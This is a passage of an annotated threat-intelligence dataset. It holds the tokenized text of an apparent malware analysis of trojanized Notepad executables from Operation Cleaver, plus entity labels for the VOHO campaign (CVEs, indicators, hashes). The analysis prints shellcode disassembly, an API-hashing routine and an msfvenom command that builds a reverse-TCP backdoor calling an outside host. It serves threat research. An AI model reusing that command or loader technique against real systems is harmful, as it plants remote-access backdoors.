",", "st(4)"], ["fnstenv", "[esp-0C]"], ["pop", "ebx"], ["sub", "ecx", ",", "ecx"], ["0010007A"], ["mov"], ["cl", ",", "49"], ["0010007A"], ["0010007C"], ["0010007F"], ["00100082"], ["00100085"], ["mov", "cl", ",", "49"], ["xor", "[ebx+14]", ",", "eax"], ["add", "ebx", ",", "4"], ["add", "eax", ",", "[ebx+10]"], ["scasd", ";", "incorrect", "disassembly", "of", "encoded", "byte"], ["Finally", ",", "at", "the", "end", "of", "six", "nested", "decoders", ",", "we", "see", "the", "light:"], ["00100087"], ["00100088"], ["0010008D"], ["0010008E"], ["00100090"], ["00100092"], ["00100096"], ["00100099"], ["0010009C"], ["0010009F"], ["001000A3"], ["001000A5"], ["001000A7"], ["001000A8"], ["001000AA"], ["001000AC"], ["001000AE"], ["001000B1"], ["", ".", ".."], ["cld"], ["call", "00100116"], ["pushad"], ["mov", "ebp", ",", "esp"], ["xor", "edx", ",", "edx"], ["mov", "edx", ",", "fs:[edx+30]", ";", "PTEB->ProcessEnvironmentBlock"], ["mov", "edx", ",", "[edx+0C]", ";", "PPEB->Ldr"], ["mov", "edx", ",", "[edx+14]", ";", "PPEB_LDR_DATA->InMemoryOrderModuleList"], ["mov", "esi", ",", "[edx+28]", ";", "PLDR_MODULE", ".", "BaseDllName.Buffer"], ["movzx", "ecx", ",", "word", "ptr", "[edx+26]", ";", "PLDR_MODULE", ".", "BaseDllName.MaximumLength"], ["xor", "edi", ",", "edi"], ["xor", "eax", ",", "eax"], ["lodsb"], ["cmp", "al", ",", "61", ";", "check", "for", "lowercase", "letter"], ["jl", "001000ae"], ["sub", "al", ",", "20", ";", "convert", "to", "uppercase"], ["ror", "edi", ",", "0D"], ["add", "edi", ",", "eax"], ["It", "looks", "like", "a", "call", "over", "a", "typical", "module", "or", "export", "lookup", "function", ".", "In", "fact", ",", "it", "is", ",", "and", "as", "the", "RORADD", "pair", "suggests", ",", "it", "implements", "module", "name", "and", "export", "name", "hashing", ",", "the", "algorithms", "of"], ["which", "can", "be", "expressed", "as", "follows:"], ["unsigned", "int", "GetModuleNameHash(PLDR_MODULE", "pLdrModule)"], ["{"], ["unsigned", "int", "hash", "=", "0;"], ["char", "*", "p", "=", "(char", "*)", "pLdrModule->BaseDllName->Buffer;"], ["for", "(int", "n", "=", "pLdrModule->BaseDllName->MaximumLength;", "n", "", "!", "=", "0;", "p++", ",", "n--)"], ["{"], ["char", "ch", "=", "*p;"], ["if", "(ch", ">=", "'a')", "ch", "-=", "0x20;"], ["hash", "=", "_rotr(hash", ",", "13)", "+", "(unsigned", "char)", "ch;"], ["}"], ["return", "hash;"], ["}"], ["unsigned", "int", "GetExportNameHash(char", "*pszName)"], ["{"], ["unsigned", "int", "hash", "=", "0;"], ["for", "(", ";", ";", "pszName++)"], ["{"], ["hash", "=", "_rotr(hash", ",", "13)", "+", "(unsigned", "char)", "*pszName;"], ["if", "(*pszName", "==", "0)", "break;"], ["}"], ["return", "hash;"], ["}"], ["Still", ",", "this", "is", "all", "just", "preamble", ".", "What", "is", "the", "point", "that", "it", "eventually", "gets", "to", "?"], ["You'd", "be", "forgiven", "for", "assuming", "that", "the", "tremendous", "amount", "of", "effort", "poured", "into", "obfuscation"], ["means", "there's", "some", "treasure", "beyond", "all", "fables", "at", "the", "bottom", "of", "this", "erstwhile", "Notepad", ".", "Sorry", ".", "It"], ["just", "downloads", "and", "executes", "a", "block", "of", "raw", "code", ".", "(Spoiler:", "it's", "actually", "a", "Metasploit", "reverse"], ["connect", "stager", ".", ")", "Here", "is", "its", "behavior", "summarized", "as", "function", "calls:"], ["kernel32", "!", "LoadLibraryA(\"ws2_32\")"], ["ws2_32!WSAStartup(", ".", "..)"], ["s", "=", "ws2_32!WSASocketA(AF_INET", ",", "SOCK_STREAM", ",", "", ".", "..)"], ["ws2_32!connect(s", ",", "{", "sin_family", "=", "AF_INET", ",", "sin_port", "=", "htons(12345)", ",", "sin_addr", "=", "108", ".", "175.152.2"], ["30", "}", ",", "0x10)"], ["ws2_32!recv(s", ",", "&cb", ",", "4", ",", "0)"], ["p", "=", "kernel32!VirtualAlloc(NULL", ",", "cb", ",", "MEM_COMMIT", ",", "PAGE_EXECUTE_READWRITE)"], ["ws2_32!recv(s", ",", "p", ",", "cb", ",", "0)"], ["p()"], ["The", "above", "is", "known", "to", "be", "true", "for", "Notepad3", ".", "exe,", "Notepad4", ".", "exe,", "and", "notepad10", ".", "exe."], ["NOTEPAD2", ".", "EXE", "doesn't", "seem", "to", "want", "to", "run", ",", "for", "reasons", "we", "didn't", "bother", "to", "troubleshoot", "for"], ["the", "bad", "guys", "."], ["Denouement"], ["Unfortunately", ",", "we", "never", "did", "obtain", "a", "sample", "of", "the", "code", "that", "might", "have", "been", "downloaded", ".", "The"], ["key", "to", "that", "enigma-embedded", ",", "mystery-wrapped", "riddle", "is", "forever", "lost", "to", "us", ".", "The", "best", "we", "can", "do"], ["is", "read", "what's", "written", "in", "the", "Notepads", "and", "speculate", "as", "to", "why", "they", "exist", "at", "all", "."], ["Clearly", "whatever", "generator", "created", "these", "Notepads", "is", "far", ",", "far", "beyond", "the", "technical"], ["understanding", "of", "the", "Cleaver", "team", ".", "It", "stands", "to", "reason", "that", "there", "is", "a", "generator--no", "chance"], ["these", "were", "crafted", "by", "hand--and", "that", "its", "sophistication", "is", "even", "greater", "than", "that", "of", "its", "output", "."], ["Something", "like", "that", "wouldn't", "be", "used", "only", "once", ".", "Something", "like", "that", ",", "if", "this", "team", "was", "able", "to", "get"], ["ahold", "of", "it", ",", "must", "be", "out", "there", ".", "Turn", "the", "right", "corner", "of", "the", "internet", ",", "and", "you", "can", "find", "anything", ".", ".."], ["Well", "it", "so", "happens", "that", "we", "did", "eventually", "find", "it", ".", "Some", "of", "you", "have", "no", "doubt", "suspected", "it", "all"], ["along", ",", "and", "now", "I'll", "humbly", "confirm", "it", "for", "you:", "the", "Notepads", "were", ",", "in", "their", "entirety", ",", "generated", "by"], ["Metasploit", ".", "Something", "along", "the", "lines", "of", "\"msfvenom", "-x", "notepad", ".", "exe", "-p"], ["windows/shell/reverse_tcp", "-e", "x86/shikata_ga_nai", "-i", "5", "LHOST=108", ".", "175.152.230"], ["LPORT=12345", ">", "Notepad4", ".", "exe\".", "The", "\"msfvenom\"", "tool", "transmogrifies", "a", "Metasploit", "payload", "into"], ["a", "standalone", "EXE", ",", "and", "with", "the", "\"-x\"", "switch", ",", "it'll", "fuse", "the", "payload--encoded", "as", "desired--into", "a"], ["copy", "of", "an", "existing", "executable", ",", "exhibiting", "exactly", "the", "behavior", "we", "just", "described", ".", "Omne", "ignotum"], ["pro", "magnifico", ".", "Perhaps", "the", "more", "bizarre", "a", "thing", "is", ",", "the", "less", "mysterious", "it", "proves", "to", "be", "."], ["However", ",", "we're", "still", "left", "to", "wonder", "what", "Cleaver", "was", "up", "to", "when", "they", "generated", "all", "those"], ["Notepads", ".", "One", "conclusion", "Brian", "proposed", "is", "that", "they're", "intended", "as", "backdoors--replacements"], ["for", "the", "legitimate", "Notepad", "on", "a", "compromised", "system--which", "would", "enable", "Cleaver", "to", "regain"], ["access", "to", "a", "system", "at", "some", "indeterminate", "time", "in", "the", "future", ",", "the", "next", "time", "a", "user", "runs", "Notepad", "."], ["The", "team", "demonstrated", "a", "similarly", "intentioned", "tactic", "with", "a", "connect-back", "shell", "scheduled", "to", "run"], ["in", "a", "six-minute", "window", "each", "night;", "the", "Notepad", "replacement", ",", "while", "more", "intrusive", ",", "could", "be"], ["another", "example", "of", "this", "contingency", "planning", "tendency", "."], ["Or", "maybe", "the", "Notepads", "were", "only", "an", "aborted", "experiment", ",", "attempted", "and", "shelved", ",", "forgotten", "in", "a"], ["flurry", "of", "compromises", "and", "criminal", "activity", ".", "If", "nothing", "else", ",", "they", "made", "for", "an", "unexpected", "bit", "of"], ["mystery", "."], ["Tags:", "Operation", "Cleaver(//blog", ".", "cylance.com/topic/operation-cleaver)"], ["\u00ab", "Back", "to", "Blog(//blog", ".", "cylance.com)"], ["(https://cylance", ".", "com/cylance-careers)"], ["\uf167", "\uf0e1"], ["(https://www", "."], ["(https://w"], ["Careers", "@"], ["Cylance"], ["\uf09a", "\uf099"], ["(https://www", "."], ["(https://tw"], ["(https://cylance", ".", "com/company)"], ["Company"], ["Profile"], ["Blog"], ["AI", "vs", ".", "AV", "Gorillas", "and"], ["Germans", "and"], ["Gartner", ",", "oh", "my"], ["By:", "Stuart", "McClure"], ["(//blog", ".", "cylance.com/ai-vs.-av-gorillas-and-germans-and-gartner-oh-my)"], ["(https://cylance", ".", "com/products-protect)"], ["The"], ["Unbelievable"], ["Tour"], ["(https://cylance", ".", "com/events-on-tour)"], ["(https://cylance", ".", "com)"], ["Home(https://cylance", ".", "com/)"], ["Partners"], ["Events"], ["Technology"], ["Unbelievable"], ["Partners(https://cylance", ".", "com/technologyTour(https://cylance.com/even"], ["Products"], ["partner)"], ["on-tour)"], ["PROTECT(https://cylance", ".", "com/productsprotect)", "Resellers(https://cylance", ".", "com/partners-", "Events", "&"], ["reseller)", "Tradeshows(https://cylance", ".", "co"], ["PROTECT", "+", "Threat"], ["(https://www", ".", "youtube.com/user/CylanceInc)"], ["Partner", "Portal"], ["corporate-events)"], ["Zero(https://cylance", ".", "com/productsWebinars(https://cylance.com/"], ["protect-threat-zero)Login(https://cylance", ".", "portal.relayware.com/)"], ["Become", "a"], ["webinar)"], ["PROTECT", "for", "Critical"], ["(https://www", ".", "linkedin.com/company/cylanceinc)"], ["Partner(https://cylance", ".", "portal.relayware.com/?"], ["Infrastructure(https://cylance", ".", "com/productseid=register)"], ["protect-critical-infrastructure)"], ["Resources"], ["(https://www", ".", "facebook.com/CylanceInc)", "PROTECT", "for"], ["Whitepap"], ["Education(https://cylance", ".", "com/productsDatasheets(https://cylance.com"], ["Company"], ["protect-education)"], ["Who", "We"], ["Videos(//www", ".", "cylance.com/res"], ["(https://twitter", ".", "com/cylanceinc)"], ["PROTECT", "for", "Are(https://cylance", ".", "com/company)"], ["videos)"], ["18201", "Von", "Karman", ",", "Suite", "700"], ["Energy(https://cylance", ".", "com/productsNews", "+"], ["Irvine", ",", "CA", "92612"], ["protect-energy)", "Press(https://cylance", ".", "com/companyBlog(//blog.cylance.com)"], ["USA(https://www", ".", "google.com/maps/place/18201+Von+Karman+Ave+%23700,+Irvine,+CA+92612/@33.6779"], ["PROTECT", "for"], ["news-press-releases)"], ["Finance(https://cylance", ".", "com/productsAwards(https://cylance.com/company-", "Contact"], ["Call", "Us:", "1-844-CYLANCE(tel:+18442952623)protect-finance)"], ["awards)", "Us(https://cylance", ".", "com/conta"], ["1-844-295-2623(tel:+18442952623)", "PROTECT", "for", "Careers(https://cylance", ".", "com/cylanceus)"], ["Healthcare(https://cylance", ".", "com/products-", "careers)"], ["Get", "Support:", "1-866-699-9689", "(tel:+18666999686)"], ["Privacy"], ["protect-healthcare)"], ["Contact"], ["Policy(https://cylance", ".", "com/pr"], ["PROTECT", "for", "Us(https://cylance", ".", "com/contactpolicy)"], ["\u00a9", "Cylance", "Inc", ".", "All", "Rights", "Reserved"], ["Retail(https://cylance", ".", "com/productsus)"], ["Privacy"], ["protect-retail)"], ["Security"], ["Policy(https://cylance", ".", "com/privacyTerms", "Of"], ["Questions(//www", ".", "cylance.com/securitypolicy)", "Terms", "Of"], ["Service(https://cylance", ".", "com/t"], ["questions)"], ["Service(https://cylance", ".", "com/terms)Services"], ["Services"], ["Support(https://support", ".", "cylance.com/hc/enSitemap(https://cylance.com/site-", "Overview(https://cylance", ".", "com/services)"], ["\uf167"], ["\uf0e1"], ["\uf09a"], ["\uf099"], ["Services"], ["Support(https://support", ".", "cylance.com/hc/enSitemap(https://cylance.com/site-", "Overview(https://cylance", ".", "com/services)"], ["us)", "Sitemap(https://cylance", ".", "com/"], ["map)"], ["Services", "for", "Critical"], ["map)"], ["Infrastructure(https://cylance", ".", "com/servicescritical-infrastructure)"], ["Services", "for"], ["Education(https://cylance", ".", "com/serviceseducation)"], ["Services", "for"], ["Energy(https://cylance", ".", "com/servicesenergy)"], ["Services", "for"], ["Finance(https://cylance", ".", "com/servicesfinance-and-banking)"], ["Services", "for"], ["Healthcare(https://cylance", ".", "com/serviceshealthcare)"], ["Services", "for"], ["Retail(https://cylance", ".", "com/servicesretail)"]]}], [{"vertexSet": [{"old_id": "T1", "type": "Campaign", "name": "VOHO", "sent_id": 0, "pos": [1]}, {"old_id": "T2", "type": "Time", "name": "July of 2012", "sent_id": 4, "pos": [1, 3]}, {"old_id": "T3", "type": "Organization", "name": "RSA FirstWatchSM", "sent_id": 4, "pos": [6, 7]}, {"old_id": "T4", "type": "Person", "name": "Will Gragido", "sent_id": 14, "pos": []}, {"old_id": "T5", "type": "Campaign", "name": "VOHO", "sent_id": 44, "pos": []}, {"old_id": "T6", "type": "MalwareCharacteristics", "name": "Advanced Persistent Threat", "sent_id": 45, "pos": [8, 10]}, {"old_id": "T7", "type": "Location", "name": "Hong Kong", "sent_id": 48, "pos": []}, {"old_id": "T8", "type": "Malware", "name": "Gh0st RAT", "sent_id": 49, "pos": []}, {"old_id": "T9", "type": "Location", "name": "Washington DC", "sent_id": 51, "pos": [0, 2]}, {"old_id": "T10", "type": "Location", "name": "Boston Massachusetts", "sent_id": 51, "pos": [4, 6]}, {"old_id": "T11", "type": "Campaign", "name": "Aurora", "sent_id": 54, "pos": [3]}, {"old_id": "T12", "type": "Campaign", "name": "Ghostnet", "sent_id": 54, "pos": [6]}, {"old_id": "T13", "type": "MalwareCharacteristics", "name": "Water Holing", "sent_id": 59, "pos": []}, {"old_id": "T14", "type": "Payload", "name": "gh0strat", "sent_id": 68, "pos": []}, {"old_id": "T15", "type": "ExploitTargetObject", "name": "hxxp://wwwxxxxxxxxtrustcom", "sent_id": 76, "pos": []}, {"old_id": "T16", "type": "ExploitTargetObject", "name": "hxxp://xxxxxxcountymdgov", "sent_id": 78, "pos": []}, {"old_id": "T17", "type": "ExploitTargetObject", "name": "hxxp://ifxxorg", "sent_id": 84, "pos": []}, {"old_id": "T18", "type": "ExploitTargetObject", "name": "hxxp://xxxxxxcenterorg", "sent_id": 86, "pos": []}, {"old_id": "T19", "type": "ExploitTargetObject", "name": "hxxp://xxiorg", "sent_id": 88, "pos": []}, {"old_id": "T20", "type": "ExploitTargetObject", "name": "hxxp://xxxxxxxpriono", "sent_id": 90, "pos": []}, {"old_id": "T21", "type": "ExploitTargetObject", "name": "hxxp:/xxxxxxxxpoliticscom", "sent_id": 92, "pos": []}, {"old_id": "T22", "type": "ExploitTargetObject", "name": "hxxp://wwwrfxxxorg", "sent_id": 94, "pos": []}, {"old_id": "T23", "type": "Organization", "name": "Defense Industrial Base and Educational community", "sent_id": 95, "pos": [5, 10]}, {"old_id": "T24", "type": "ExploitTargetObject", "name": "hxxp://wwwgftxxxorg", "sent_id": 98, "pos": []}, {"old_id": "T25", "type": "ExploitTargetObject", "name": "hxxp://wwwxxxxxxantennascom", "sent_id": 100, "pos": []}, {"old_id": "T26", "type": "ExploitTargetObject", "name": "Defense Industrial Base", "sent_id": 109, "pos": [0, 2]}, {"old_id": "T27", "type": "Exploit", "name": "hxxp://xxxxxxxcurlingcom", "sent_id": 115, "pos": []}, {"old_id": "T28", "type": "Vulnerability", "name": "CVE-2012-1889", "sent_id": 119, "pos": [5]}, {"old_id": "T29", "type": "Vulnerability", "name": "CVE-2012-1723", "sent_id": 121, "pos": [3]}, {"old_id": "T30", "type": "Malware", "name": "Gh0st RAT", "sent_id": 122, "pos": []}, {"old_id": "T31", "type": "Address", "name": "586415559", "sent_id": 125, "pos": []}, {"old_id": "T32", "type": "Address", "name": "586415557", "sent_id": 127, "pos": []}, {"old_id": "T33", "type": "Vulnerability", "name": "CVE-2008-3869", "sent_id": 133, "pos": []}, {"old_id": "T34", "type": "Vulnerability", "name": "CVE-2008-3870", "sent_id": 133, "pos": []}, {"old_id": "T35", "type": "Exploit", "name": "iframejs", "sent_id": 142, "pos": []}, {"old_id": "T36", "type": "Malware", "name": "Gh0st RAT", "sent_id": 144, "pos": [0, 1]}, {"old_id": "T37", "type": "Malware", "name": "gh0st", "sent_id": 147, "pos": [0]}, {"old_id": "T38", "type": "Vulnerability", "name": "CVE-2012-1889", "sent_id": 150, "pos": [5]}, {"old_id": "T39", "type": "Vulnerability", "name": "CVE-2012-1723", "sent_id": 152, "pos": [3]}, {"old_id": "T40", "type": "Time", "name": "June 25th 2012", "sent_id": 154, "pos": [8, 11]}, {"old_id": "T41", "type": "Time", "name": "July 18th 2012", "sent_id": 154, "pos": [13, 11]}, {"old_id": "T42", "type": "Vulnerability", "name": "CVE-2012-1889", "sent_id": 155, "pos": [6]}, {"old_id": "T43", "type": "Vulnerability", "name": "CVE-2012-1889", "sent_id": 157, "pos": [8]}, {"old_id": "T44", "type": "Indicator", "name": "http://wwwxxxxxxxcurlingcom/Results/cx/magma/iframejs", "sent_id": 160, "pos": []}, {"old_id": "T45", "type": "Indicator", "name": "http://wwwxxxxxxxcurlingcom/Results/cx/magma/modulephp", "sent_id": 161, "pos": []}, {"old_id": "T46", "type": "Indicator", "name": "http://wwwxxxxxxxcurlingcom/Results/cx/magma/enginejs", "sent_id": 162, "pos": []}, {"old_id": "T47", "type": "Indicator", "name": "http://wwwxxxxxxxcurlingcom/Results/cx/magma/ifhtm", "sent_id": 163, "pos": []}, {"old_id": "T48", "type": "Indicator", "name": "http://wwwxxxxxxxcurlingcom/Results/cx/magma/enbluehtm", "sent_id": 164, "pos": []}, {"old_id": "T49", "type": "Indicator", "name": "http://wwwxxxxxxxcurlingcom/Results/cx/magma/bookcab", "sent_id": 165, "pos": []}, {"old_id": "T50", "type": "Vulnerability", "name": "CVE-2007-4848", "sent_id": 178, "pos": []}, {"old_id": "T51", "type": "Exploit", "name": "Enginejs", "sent_id": 177, "pos": []}, {"old_id": "T52", "type": "Organization", "name": "Trend Micro", "sent_id": 180, "pos": [0, 1]}, {"old_id": "T53", "type": "Organization", "name": "McAfee", "sent_id": 182, "pos": [0]}, {"old_id": "T54", "type": "Organization", "name": "Symantec", "sent_id": 184, "pos": [0]}, {"old_id": "T55", "type": "Exploit", "name": "Modulephp", "sent_id": 175, "pos": []}, {"old_id": "T56", "type": "Exploit", "name": "Iframejs", "sent_id": 170, "pos": []}, {"old_id": "T57", "type": "Exploit", "name": "ifhtm", "sent_id": 186, "pos": []}, {"old_id": "T58", "type": "Time", "name": "July of 2011", "sent_id": 189, "pos": [12, 14]}, {"old_id": "T59", "type": "Person", "name": "Mila Parkour", "sent_id": 190, "pos": []}, {"old_id": "T60", "type": "Region", "name": "Asia", "sent_id": 191, "pos": [14]}, {"old_id": "T61", "type": "Exploit", "name": "xKungfoo", "sent_id": 192, "pos": [4]}, {"old_id": "T62", "type": "Exploit", "name": "xKungFoo", "sent_id": 195, "pos": [16]}, {"old_id": "T63", "type": "Software", "name": "Windows XP", "sent_id": 210, "pos": [0, 1]}, {"old_id": "T64", "type": "Software", "name": "Windows 2003", "sent_id": 212, "pos": [0, 1]}, {"old_id": "T65", "type": "Software", "name": "Windows VistaWindows 7", "sent_id": 214, "pos": [0, 2]}, {"old_id": "T66", "type": "Exploit", "name": "Enbluehtm", "sent_id": 233, "pos": []}, {"old_id": "T67", "type": "Vulnerability", "name": "CVE-2012-1889", "sent_id": 233, "pos": [5]}, {"old_id": "T68", "type": "Malware", "name": "gh0st RAT", "sent_id": 234, "pos": [9, 10]}, {"old_id": "T69", "type": "Payload", "name": "Bookcab", "sent_id": 239, "pos": []}, {"old_id": "T70", "type": "Payload", "name": "Bookcab", "sent_id": 240, "pos": []}, {"old_id": "T71", "type": "Malware", "name": "gh0st RAT", "sent_id": 241, "pos": [5, 6]}, {"old_id": "T72", "type": "Malware", "name": "vptrayexe", "sent_id": 241, "pos": []}, {"old_id": "T73", "type": "MD5", "name": "e6b43 c299a9a1f5abd9be2b729e54577", "sent_id": 241, "pos": []}, {"old_id": "T74", "type": "Indicator", "name": "hxxp://wwwxxxxxxxcurlingcom/Docs/BW06/iframejs", "sent_id": 248, "pos": []}, {"old_id": "T75", "type": "Indicator", "name": "hxxp://wwwxxxxxxxcurlingcom/Docs/BW06/modulephp", "sent_id": 249, "pos": []}, {"old_id": "T76", "type": "Indicator", "name": "hxxp://wwwxxxxxxxcurlingcom/Docs/BW06/enginejs", "sent_id": 250, "pos": []}, {"old_id": "T77", "type": "Indicator", "name": "hxxp://wwwxxxxxxxcurlingcom/Docs/BW06/ifhtm", "sent_id": 251, "pos": []}, {"old_id": "T78", "type": "Indicator", "name": "hxxp://wwwxxxxxxxcurlingcom/Docs/BW06/appletjar", "sent_id": 252, "pos": []}, {"old_id": "T79", "type": "Exploit", "name": "Ifhtm", "sent_id": 255, "pos": []}, {"old_id": "T80", "type": "Obfuscation", "name": "XOR 77", "sent_id": 258, "pos": [9, 10]}, {"old_id": "T81", "type": "MD5", "name": "2fe340fe2574ae540bd98bd9af8ec67d", "sent_id": 259, "pos": []}, {"old_id": "T82", "type": "Malware", "name": "appletjar", "sent_id": 257, "pos": []}, {"old_id": "T83", "type": "TrojanHorse", "name": "Gh0st RAT", "sent_id": 323, "pos": [0, 1]}, {"old_id": "T84", "type": "ExploitTargetObject", "name": "Dalai Lama", "sent_id": 347, "pos": [2, 3]}, {"old_id": "T85", "type": "Malware", "name": "ZeuS", "sent_id": 355, "pos": [8]}, {"old_id": "T86", "type": "Malware", "name": "VPTrayEXE", "sent_id": 377, "pos": []}, {"old_id": "T87", "type": "MD5", "name": "e6b43c299a9a1f5abd9be2b729e54577", "sent_id": 378, "pos": [0]}, {"old_id": "T88", "type": "Malware", "name": "UPBAK", "sent_id": 409, "pos": []}, {"old_id": "T89", "type": "Address", "name": "13425524247", "sent_id": 430, "pos": []}, {"old_id": "T90", "type": "Malware", "name": "VPTrayEXE", "sent_id": 429, "pos": []}, {"old_id": "T91", "type": "MD5", "name": "acc583fc596d38626d37cbf6de8a01cb", "sent_id": 455, "pos": [0]}, {"old_id": "T92", "type": "Malware", "name": "VPTrayEXE", "sent_id": 456, "pos": []}, {"old_id": "T93", "type": "MD5", "name": "b894efe4173f90479fddff455daf6ff3", "sent_id": 457, "pos": [0]}, {"old_id": "T95", "type": "Indicator", "name": "usc-datasurootcom", "sent_id": 490, "pos": []}, {"old_id": "T96", "type": "Malware", "name": "VPTrayEXE", "sent_id": 489, "pos": []}, {"old_id": "T97", "type": "Malware", "name": "SvohostEXE", "sent_id": 506, "pos": []}, {"old_id": "T98", "type": "MD5", "name": "2fe340fe2574ae540bd98bd9af8ec67d", "sent_id": 507, "pos": [0]}, {"old_id": "T94", "type": "Malware", "name": "SVOHOSTEXE", "sent_id": 513, "pos": []}, {"old_id": "T99", "type": "Obfuscation", "name": "HEX digits", "sent_id": 526, "pos": [5, 6]}, {"old_id": "T100", "type": "Address", "name": "586415559", "sent_id": 546, "pos": []}, {"old_id": "T101", "type": "Malware", "name": "SVOHOSTEXE", "sent_id": 547, "pos": []}, {"old_id": "T102", "type": "Campaign", "name": "VOHO", "sent_id": 568, "pos": [0]}, {"old_id": "T103", "type": "Time", "name": "June 25 2012", "sent_id": 575, "pos": [6, 9]}, {"old_id": "T104", "type": "Software", "name": "Internet Explorer", "sent_id": 576, "pos": [7, 8]}, {"old_id": "T105", "type": "Time", "name": "July 9 2012", "sent_id": 576, "pos": [11, 14]}, {"old_id": "T106", "type": "Time", "name": "July 10th", "sent_id": 581, "pos": [7, 8]}, {"old_id": "T107", "type": "ExploitTargetObject", "name": "Sun Java", "sent_id": 583, "pos": [12, 13]}, {"old_id": "T108", "type": "Time", "name": "July 16 2012", "sent_id": 583, "pos": []}, {"old_id": "T109", "type": "Time", "name": "July 18 2012", "sent_id": 586, "pos": [5, 8]}, {"old_id": "T110", "type": "MD5", "name": "03db29c71b0031af08081f5e2f7dcdf2", "sent_id": 702, "pos": [0]}, {"old_id": "T111", "type": "MD5", "name": "644161889f0f60885b2a0eec12038b66", "sent_id": 703, "pos": [0]}, {"old_id": "T112", "type": "Address", "name": "5864143245", "sent_id": 705, "pos": []}, {"old_id": "T113", "type": "Indicator", "name": "Wsdhealthycom", "sent_id": 698, "pos": []}, {"old_id": "T114", "type": "Indicator", "name": "usc-datasurootcom", "sent_id": 707, "pos": []}, {"old_id": "T115", "type": "Indicator", "name": "usa-mailscieroncom", "sent_id": 708, "pos": []}, {"old_id": "T116", "type": "Indicator", "name": "dllfreshdnsorg", "sent_id": 709, "pos": []}, {"old_id": "T117", "type": "Exploit", "name": "wwwwsdhealthycom/userfiles/file/Applet19html", "sent_id": 714, "pos": []}, {"old_id": "T118", "type": "Exploit", "name": "wwwwsdhealthycom/userfiles/file/Applet19exe", "sent_id": 715, "pos": []}, {"old_id": "T119", "type": "Exploit", "name": "wwwwsdhealthycom/userfiles/file/Applethtml", "sent_id": 716, "pos": []}, {"old_id": "T120", "type": "Exploit", "name": "wwwwsdhealthycom/userfiles/file/Appletjar", "sent_id": 717, "pos": []}, {"old_id": "T121", "type": "Exploit", "name": "wwwwsdhealthycom/userfiles/file/Appletexe", "sent_id": 718, "pos": []}, {"old_id": "T122", "type": "Vulnerability", "name": "CVE\u20132011-3544", "sent_id": 721, "pos": [0]}, {"old_id": "T123", "type": "Address", "name": "586415559", "sent_id": 729, "pos": []}, {"old_id": "T124", "type": "Address", "name": "586415557", "sent_id": 730, "pos": []}, {"old_id": "T125", "type": "Address", "name": "5864143245", "sent_id": 731, "pos": []}, {"old_id": "T126", "type": "Malware", "name": "gh0st RAT", "sent_id": 729, "pos": []}, {"old_id": "T127", "type": "Indicator", "name": "wsdhealthycom", "sent_id": 733, "pos": []}, {"old_id": "T128", "type": "Indicator", "name": "*******curlingcom", "sent_id": 734, "pos": []}, {"old_id": "T129", "type": "Indicator", "name": "usc-datasurootcom", "sent_id": 735, "pos": []}, {"old_id": "T130", "type": "Indicator", "name": "usa-mailscieroncom", "sent_id": 736, "pos": []}, {"old_id": "T131", "type": "Indicator", "name": "dllfreshdnsorg", "sent_id": 737, "pos": []}, {"old_id": "T132", "type": "Malware", "name": "gh0st RAT", "sent_id": 735, "pos": []}, {"old_id": "T133", "type": "Malware", "name": "gh0st RAT", "sent_id": 736, "pos": []}, {"old_id": "T134", "type": "Malware", "name": "gh0st RAT", "sent_id": 737, "pos": []}, {"old_id": "T135", "type": "MD5", "name": "03db29c71b0031af08081f5e2f7dcdf2", "sent_id": 746, "pos": [0]}, {"old_id": "T136", "type": "MD5", "name": "644161889f0f60885b2a0eec12038b66", "sent_id": 747, "pos": [0]}, {"old_id": "T137", "type": "MD5", "name": "e6b43c299a9a1f5abd9be2b729e54577", "sent_id": 748, "pos": [0]}, {"old_id": "T138", "type": "MD5", "name": "2fe340fe2574ae540bd98bd9af8ec67d", "sent_id": 749, "pos": [0]}, {"old_id": "T139", "type": "Address", "name": "586415559", "sent_id": 751, "pos": []}, {"old_id": "T140", "type": "Address", "name": "586415557", "sent_id": 751, "pos": []}, {"old_id": "T141", "type": "Address", "name": "5864143245", "sent_id": 751, "pos": []}, {"old_id": "T142", "type": "Address", "name": "642617474", "sent_id": 751, "pos": []}, {"old_id": "T143", "type": "Malware", "name": "gh0st RAT", "sent_id": 740, "pos": [2, 3]}, {"old_id": "T144", "type": "Malware", "name": "Gh0st RAT", "sent_id": 754, "pos": [1, 2]}, {"old_id": "T145", "type": "Exploit", "name": "xKungFoo", "sent_id": 768, "pos": []}], "labels": [{"old_id": "R1", "r": "P32", "h": 4, "t": 6, "evidence": [44, 45, 46, 47, 48]}, {"old_id": "R2", "r": "P7", "h": 26, "t": 27, "evidence": [115, 116, 117, 118, 119]}, {"old_id": "R3", "r": "P7", "h": 26, "t": 28, "evidence": [115, 116, 117, 118, 119, 120, 121]}, {"old_id": "R4", "r": "P21", "h": 30, "t": 29, "evidence": []}, {"old_id": "R5", "r": "P21", "h": 31, "t": 29, "evidence": []}, {"old_id": "R6", "r": "P7", "h": 36, "t": 37, "evidence": [147, 148, 149, 150]}, {"old_id": "R7", "r": "P7", "h": 36, "t": 38, "evidence": [147, 148, 149, 150, 151, 152]}, {"old_id": "R8", "r": "P7", "h": 50, "t": 49, "evidence": [177, 178]}, {"old_id": "R9", "r": "P33", "h": 50, "t": 57, "evidence": [177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189]}, {"old_id": "R10", "r": "P7", "h": 65, "t": 66, "evidence": [233]}, {"old_id": "R11", "r": "P21", "h": 72, "t": 71, "evidence": [241]}, {"old_id": "R12", "r": "P21", "h": 80, "t": 81, "evidence": []}, {"old_id": "R13", "r": "P21", "h": 88, "t": 89, "evidence": []}, {"old_id": "R15", "r": "P21", "h": 93, "t": 94, "evidence": []}, {"old_id": "R14", "r": "P21", "h": 96, "t": 95, "evidence": []}, {"old_id": "R16", "r": "P21", "h": 92, "t": 91, "evidence": []}, {"old_id": "R17", "r": "P21", "h": 90, "t": 91, "evidence": [455, 456]}, {"old_id": "R18", "r": "P21", "h": 86, "t": 85, "evidence": []}, {"old_id": "R19", "r": "P21", "h": 99, "t": 100, "evidence": [546, 547]}, {"old_id": "R20", "r": "P33", "h": 101, "t": 102, "evidence": [568, 569, 570, 571, 572, 573, 574, 575]}, {"old_id": "R21", "r": "P33", "h": 101, "t": 104, "evidence": [568, 569, 570, 571, 572, 573, 574, 575, 576]}, {"old_id": "R22", "r": "P33", "h": 101, "t": 105, "evidence": [568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581]}, {"old_id": "R23", "r": "P33", "h": 101, "t": 107, "evidence": [568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583]}, {"old_id": "R24", "r": 